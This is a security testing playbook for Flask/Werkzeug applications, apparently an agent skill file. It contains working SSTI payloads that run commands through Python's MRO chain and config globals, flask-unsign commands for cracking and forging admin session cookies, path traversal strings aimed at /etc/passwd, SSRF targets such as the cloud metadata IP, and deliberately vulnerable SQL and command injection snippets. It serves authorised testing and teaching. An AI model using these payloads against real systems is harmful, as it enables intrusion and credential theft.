---
name: flask
description: Security testing playbook for Flask applications covering Jinja2 SSTI, client-side sessions, Werkzeug debugger, and input sink vulnerabilities
---

# Flask

Security testing for Flask/Werkzeug applications. Focus on Jinja2 template injection, client-side signed sessions, Werkzeug debugger exposure, and unvalidated input reaching SQL, command, and template sinks through Flask's minimal-by-default architecture.

## Attack Surface

**Core Components**
- Routing: URL rules, blueprints, `<converter:name>` path parameters, `methods` kwarg
- Templates: Jinja2 (`render_template`, `render_template_string`), autoescape on `.html`/`.htm`/`.xml`
- Request data: `request.args`, `request.form`, `request.json`, `request.files`, `request.data`
- Sessions: client-side signed cookies via `itsdangerous` and `SECRET_KEY`

**Extensions & ORM**
- SQLAlchemy (Flask-SQLAlchemy): `text()`, `db.session.execute()`, raw SQL strings
- Flask-Login, Flask-Security, Flask-JWT-Extended for auth
- Flask-WTF for forms/CSRF, Flask-CORS for cross-origin
- Flask-Caching (Redis/Memcached backends), Flask-Session (server-side sessions)

**Deployment**
- Werkzeug development server, interactive debugger, reloader
- Gunicorn/uWSGI behind nginx, ASGI via Quart
- `DEBUG=True` in production, `SECRET_KEY` in source or environment

## High-Value Targets

- Endpoints using `render_template_string()` with user input (SSTI → RCE)
- Werkzeug interactive debugger (`/console`) when `debug=True`
- Session cookies when `SECRET_KEY` is weak, default, or leaked
- File download endpoints using `send_file()` / `send_from_directory()` with user paths
- Admin blueprints without consistent `@login_required` on all routes
- API endpoints accepting `request.json` fed into SQLAlchemy `text()` or raw `db.session.execute()`
- Webhook/import endpoints fetching user-supplied URLs (SSRF)
- Celery/RQ task triggers accepting user IDs without ownership checks

## Reconnaissance

**Fingerprinting**
```
curl -sI https://target/
# Server: Werkzeug/3.x.x Python/3.x.x  (dev server — immediate finding)
# Set-Cookie: session=eyJ...  (base64 JSON, itsdangerous-signed)

curl -s https://target/nonexistent-path
# Werkzeug default 404: plain "Not Found"
# Debug mode 404: full traceback with interactive console frames
```

**Debug Mode Detection**
```
GET /console           # Werkzeug debugger REPL (PIN-protected if debug=True)
GET /nonexistent       # Debug traceback leaks code, config, filesystem paths
```
The Werkzeug debugger exposes an interactive Python console at `/console`. If the debug error page renders, the debugger is active.

**Session Inspection**
```bash
# Sessions are base64 JSON — readable without the key
echo "eyJ..." | base64 -d
# flask-unsign for brute-force and forgery
flask-unsign --decode --cookie 'eyJ...'
flask-unsign --unsign --cookie 'eyJ...' --wordlist rockyou.txt
```

## Key Vulnerabilities

### Server-Side Template Injection (SSTI)

The primary RCE vector. Risk exists when user input reaches `render_template_string()` or `Template()` with user-controlled source. Standard `render_template()` with file-based templates is safe unless the template file path is user-controlled.

**Detection**
```
{{7*7}}              → 49 confirms Jinja2 evaluation
{{config}}           → dumps Flask config including SECRET_KEY
{{request.environ}}  → WSGI environ with server internals
```

**RCE via MRO sandbox escape**
```python
# Enumerate subclasses to find os/subprocess access
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen or os._wrap_close (index varies by Python version)
{{''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate()}}
# Alternative via config globals
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

`SandboxedEnvironment` restricts attribute access at the Jinja evaluation layer but does not prevent the MRO chain — Python-level attribute resolution still works. The available subclass index depends on the Python version and loaded modules.

Cross-ref: `ssti` for polyglot payloads and template engine fingerprinting.

### Session Security

Flask sessions are **client-side signed cookies** — base64-encoded JSON signed with `itsdangerous.URLSafeTimedSerializer` using `SECRET_KEY`. The payload is **signed but not encrypted**: anyone can read the contents; forging requires the key.

**Attack paths**
- **Weak/default SECRET_KEY**: values like `'dev'`, `'secret'`, `'changeme'`, or hardcoded strings allow forgery via `flask-unsign --sign`.
- **Key in source/config leak**: debug page (`{{config.SECRET_KEY}}` via SSTI), `.env` in web root, git history, error tracebacks.
- **No session expiration**: Flask sessions lack expiry by default; `PERMANENT_SESSION_LIFETIME` must be explicitly set. `SESSION_COOKIE_SECURE` defaults to `False` and `SESSION_COOKIE_SAMESITE` defaults to `None` — both must be explicitly configured for HTTPS deployments.
- **Pickle-based backends**: `Flask-Session` with Redis or filesystem backends may use pickle serialization — forged session data triggers deserialization RCE if the signing key is known.

```bash
flask-unsign --decode --cookie 'session=eyJ...'
flask-unsign --unsign --cookie 'session=eyJ...' --wordlist /usr/share/wordlists/rockyou.txt
flask-unsign --sign --cookie '{"user_id":1,"is_admin":true}' --secret 'the-key'
```

Cross-ref: `cryptographic_failures` for weak signing key patterns; `insecure_deserialization` for pickle session backends.

### Werkzeug Debug Mode

`app.run(debug=True)` or `FLASK_DEBUG=1` enables the Werkzeug interactive debugger — a full Python REPL accessible from browser error pages.

**PIN derivation**
The `/console` endpoint requires a PIN, derived deterministically from:
- Username running the process (`/proc/self/environ` → `USER`, or `getpass.getuser()`)
- Module name: `flask.app`
- App class name: `Flask`
- Path to `flask/app.py` on disk
- MAC address of primary interface (`/sys/class/net/<iface>/address` → `uuid.getnode()`)
- Machine ID (`/etc/machine-id`, `/proc/sys/kernel/random/boot_id`, or Docker cgroup ID)

If these values are obtainable via LFI, SSRF, SSTI (`{{config}}`), or information disclosure, the PIN can be recomputed. Newer Werkzeug versions (≥2.1) hash with SHA-1 then PBKDF2.

```python
# Once debugger console is accessible:
import os; os.popen('id').read()
```

**CVE-2024-34069** (Werkzeug < 3.0.3, CVSS 7.5): DNS rebinding attack bypasses the debugger's localhost-only binding. An attacker controlling a domain can redirect a developer's browser to the debugger endpoint on `127.0.0.1`, enabling RCE if the PIN is entered. Fixed in Werkzeug 3.0.3 via a `trusted_hosts` allowlist.

Cross-ref: `rce` for post-exploitation; `information_disclosure` for leaking PIN derivation inputs.

### File Serving & Path Traversal

```python
# Vulnerable: user input directly in send_file
@app.route('/download')
def download():
    return send_file(request.args['path'])  # traversal

# send_from_directory restricts to a base — but test edge cases
```

`safe_join()` validates against traversal but test with encoded variants:
```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//etc/passwd
```

Cross-ref: `path_traversal_lfi_rfi` for traversal payloads and encoding bypasses.

### Routing & Blueprint Auth Gaps

- Blueprint registered without `@login_required` or `before_request` auth — new blueprints often miss the auth pattern of existing ones.
- `<path:filename>` converter matches slashes, expanding reachable URL space beyond developer intent.
- Method routing: endpoint allowing `GET` may also accept `POST`/`PUT`/`DELETE` if `methods` is over-broad.
- Blueprint-level `before_request` only runs for that blueprint — a global `@app.before_request` auth check that exempts certain paths can be bypassed with path manipulation.

### Injection Sinks

**SQL Injection via SQLAlchemy**
```python
# Vulnerable patterns — string formatting into raw SQL
db.session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))
db.engine.execute(f"SELECT * FROM users WHERE id = {user_id}")
User.query.filter(text(f"role = '{role}'"))
```
ORM `filter_by()` and parameterized `filter()` are safe; `text()` with f-strings, `db.session.execute()` with string formatting, and `.raw()` are sinks.

Cross-ref: `sql_injection` for injection payloads and blind/time-based techniques.

**Command Injection**
```python
os.system(f"convert {request.form['file']} output.pdf")
subprocess.call(request.args['cmd'], shell=True)
```
Flask request objects deliver unsanitized user input; any flow reaching `os.system`, `subprocess`, `eval`, `exec` is a sink.

Cross-ref: `rce` for command injection and OS-specific payloads.

**SSRF**
```python
resp = requests.get(request.json['url'])  # server-side fetch of attacker-controlled URL
```
Test: `http://127.0.0.1`, `http://169.254.169.254/latest/meta-data/`, `http://[::1]`, redirect chains to internal hosts.

Cross-ref: `ssrf` for SSRF payloads, DNS rebinding, and cloud metadata targets.

### Insecure Deserialization

- **Flask-Caching**: Redis/Memcached backends default to pickle serialization. Cache poisoning or exposed backend → inject malicious pickle → RCE.
- **Flask-Session**: server-side backends (Redis, filesystem) may pickle session data — forgery with a known key triggers deserialization.
- **`pickle.loads()` / `yaml.load()`** in application code processing uploads or API payloads.

Cross-ref: `insecure_deserialization` for pickle/YAML gadget chains.

### CSRF

Flask has **no built-in CSRF protection** — it relies on `Flask-WTF` (`CSRFProtect`). Applications without it or with `@csrf.exempt` on sensitive routes are vulnerable.

- API endpoints using cookie-based session auth without CSRF tokens
- JSON endpoints: CSRF via `fetch()` from attacker origin if CORS permits credentials

Cross-ref: `csrf` for cross-origin attack techniques and bypass patterns.

## Bypass Techniques

- Content-type switching: `application/json` vs `application/x-www-form-urlencoded` reaching different `request` attributes
- Trailing slash redirect: Flask normalizes `/path` → `/path/` (configurable) — auth middleware may not follow
- Blueprint prefix traversal: `/bp/../other` may resolve differently in Flask vs reverse proxy
- Parameter pollution: `?id=1&id=2` — `request.args.get('id')` returns first; `getlist('id')` returns all
- Session expiry: absent `PERMANENT_SESSION_LIFETIME` means sessions accepted indefinitely

## Testing Methodology

1. **Fingerprint** — Identify Flask/Werkzeug via `Server` header, `session=` cookie format, error pages
2. **Debug check** — Request `/console` and non-existent paths to detect debug mode
3. **Session analysis** — Decode session cookies; brute-force `SECRET_KEY` with `flask-unsign`
4. **Auth matrix** — Test each blueprint/route across unauthenticated, user, and admin roles
5. **SSTI probing** — Inject `{{7*7}}` in all input fields, parameters, and headers reaching templates
6. **Injection audit** — Trace `request.*` input to SQL, command, file, and template sinks
7. **File serving** — Test path traversal on download and static-serving endpoints
8. **SSRF** — Test all URL-fetching endpoints with loopback and metadata IPs

## Validation Requirements

- SSTI: `{{7*7}}`→`49` in response, or config/environ dump confirming evaluation
- Session forgery: forged cookie accepted by server (altered role/user_id proves impact)
- Debug RCE: command output from `/console` execution
- Path traversal: file contents from outside intended directory
- SQLi: error-based, blind, or time-based evidence of query manipulation
- Auth bypass: side-by-side requests showing unauthorized access to protected routes
- SSRF: out-of-band callback or response differences confirming server-side fetch

## Tooling

- **flask-unsign** — decode, brute-force, and forge Flask session cookies
- **semgrep** with `p/flask` — flags `render_template_string`, `send_file(request.*)`, `text()` with f-strings, `debug=True`: `semgrep --config p/flask .`
- **bandit** — Python security linter catching `subprocess`, `eval`, hardcoded secrets, `debug=True`: `bandit -r . -ll`
- **sqlmap** — automated SQL injection on endpoints with raw SQLAlchemy queries

## Summary

Flask's microframework design means security features are opt-in. No built-in CSRF, no server-side sessions, no ORM parameterization on raw queries, no production guard against debug mode. Every security layer depends on the developer choosing and configuring an extension. Test the gaps between what Flask provides and what the application assumes is handled.
